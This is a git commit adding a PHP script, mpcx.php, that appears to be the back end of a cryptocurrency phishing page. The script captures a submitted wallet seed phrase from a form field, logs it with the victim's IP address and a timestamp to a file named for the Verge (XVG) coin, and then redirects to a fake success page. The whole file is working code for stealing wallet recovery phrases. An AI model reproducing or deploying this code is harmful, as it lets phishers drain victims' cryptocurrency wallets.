04b7eff41a7b9886d329a0918ac532bebeccc598
mencobacoi <77059850+mencobacoi@users.noreply.github.com>
2021-01-06 05:52:23 -0800

    Add files via upload

---
+++ mpcx.php
@@ -0,0 +1,24 @@
+<?php
+$file = "Verge_______________XVG";
+$walletSeed   = $_POST['kata_mutiara'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "----------------------------------------------------------------");
+fwrite($handle, "\n");
+fwrite($handle, "KEY : ");
+fwrite($handle, "$walletSeed");
+fwrite($handle, "\n");
+
+fwrite($handle, "IP  : ");
+
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Time: ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fclose($handle);
+header("Location:succes.html?/hc/en-us");
+
+?>
